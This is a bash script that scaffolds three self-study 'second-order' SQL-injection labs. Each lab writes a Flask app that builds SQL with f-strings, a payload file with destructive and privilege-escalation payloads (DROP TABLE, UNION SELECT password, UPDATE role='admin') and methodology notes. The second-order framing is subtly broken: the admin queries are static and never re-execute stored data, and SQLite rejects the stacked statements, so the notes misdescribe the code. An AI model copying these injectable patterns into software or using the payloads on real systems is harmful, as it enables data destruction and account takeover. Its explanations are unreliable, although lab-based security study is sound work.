#!/usr/bin/env bash
set -e

BASE="/home/karime/portswigger_labs/sqli/04-second-order"

echo "[+] Building Second-Order SQLi Series..."
echo "    $BASE"

mkdir -p "$BASE"/{01-stored-injection,02-context-switch,03-business-chain}
mkdir -p "$BASE"/{01-stored-injection,02-context-switch,03-business-chain}/{vuln,exploit,notes,fix,payloads,db}

# =========================================================
# LAB 1 — STORED INJECTION
# =========================================================

cat > "$BASE/01-stored-injection/README.md" << 'EOF'
# LAB 1 — Stored SQL Injection

Payload stored in DB, executed later in admin panel.
EOF

cat > "$BASE/01-stored-injection/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/register", methods=["POST"])
def register():

    username = request.form.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # stored directly (unsafe)
    cur.execute(f"INSERT INTO users(username) VALUES('{username}')")
    conn.commit()

    return {"status": "registered"}

@app.route("/admin/users")
def admin():

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # later execution context
    result = cur.execute("SELECT username FROM users").fetchall()

    return {"users": result}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/01-stored-injection/exploit/payloads.txt" << 'EOF'
# Stored payload

admin'); DROP TABLE users;--

admin' UNION SELECT password FROM secrets--
EOF

cat > "$BASE/01-stored-injection/notes/methodology.txt" << 'EOF'
FLOW:

1. inject payload in input field
2. stored in DB
3. executed later in admin query
EOF


# =========================================================
# LAB 2 — CONTEXT SWITCH SQLi
# =========================================================

cat > "$BASE/02-context-switch/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/comment", methods=["POST"])
def comment():

    c = request.form.get("comment", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    cur.execute(f"INSERT INTO comments(text) VALUES('{c}')")
    conn.commit()

    return {"ok": True}

@app.route("/admin/review")
def review():

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # different execution context
    return {"data": cur.execute("SELECT text FROM comments").fetchall()}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/02-context-switch/exploit/payloads.txt" << 'EOF'
# Stored context switch payloads

'), (SELECT username FROM users)--

'); UPDATE users SET role='admin'--
EOF

cat > "$BASE/02-context-switch/notes/methodology.txt" << 'EOF'
KEY IDEA:

Injection point ≠ execution point

Data flows into different SQL context later
EOF


# =========================================================
# LAB 3 — BUSINESS LOGIC SQLi CHAIN
# =========================================================

cat > "$BASE/03-business-chain/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/profile/update", methods=["POST"])
def update():

    bio = request.form.get("bio", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    cur.execute(f"INSERT INTO profiles(bio) VALUES('{bio}')")
    conn.commit()

    return {"status": "saved"}

@app.route("/admin/export")
def export():

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # business logic query
    return {"export": cur.execute("SELECT bio FROM profiles").fetchall()}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/03-business-chain/exploit/payloads.txt" << 'EOF'
# chain injection

'); INSERT INTO admin_logs(msg) VALUES('pwned')--

'); SELECT sqlite_version()--
EOF

cat > "$BASE/03-business-chain/notes/methodology.txt" << 'EOF'
BUSINESS LOGIC CHAIN:

1. inject into user field
2. stored in DB
3. reused in admin/export/report system
4. triggers hidden SQL execution
EOF


echo "[+] Second-Order SQLi Series completed"
